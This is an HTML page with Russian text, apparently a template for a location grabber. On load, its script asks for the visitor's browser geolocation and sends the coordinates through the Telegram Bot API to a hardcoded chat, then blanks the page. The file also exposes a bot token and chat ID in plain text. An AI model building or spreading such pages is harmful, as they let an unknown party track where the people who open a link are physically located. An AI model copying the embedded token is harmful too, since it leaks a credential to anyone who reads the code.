<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Геолокация</title>
</head>8
<body>
    <h1>Геолокация отправляется...</h1>
    <script>
        const botToken = "7010906033:AAGe4fWmuWDvz4sw-CpIAs4V1sfZ52pzJbQ"; // Вставьте токен бота
        const chatId = "2145450623"; // Вставьте ваш User ID

        // Отправка геолокации в Telegram
        function sendLocation(latitude, longitude) {
            const message = `Широта: ${latitude}, Долгота: ${longitude}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            fetch(url)
                .then(response => {
                    if (response.ok) {
                        alert("Геолокация отправлена!");
                    } else {
                        alert("Ошибка отправки геолокации.");
                    }
                })
                .catch(() => {
                    alert("Не удалось подключиться к серверу Telegram.");
                });
        }

        // Получение геолокации
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const { latitude, longitude } = position.coords;
                    sendLocation(latitude, longitude);
                    // После получения геолокации, меняем фон страницы на чёрный
                    document.body.style.backgroundColor = "black";
                    document.body.innerHTML = ""; // Очищаем текст
                },
                (error) => {
                    alert("Не удалось получить геолокацию.");
                }
            );
        } else {
            alert("Ваш браузер не поддерживает геолокацию.");
        }
    </script>
</body>
</html>
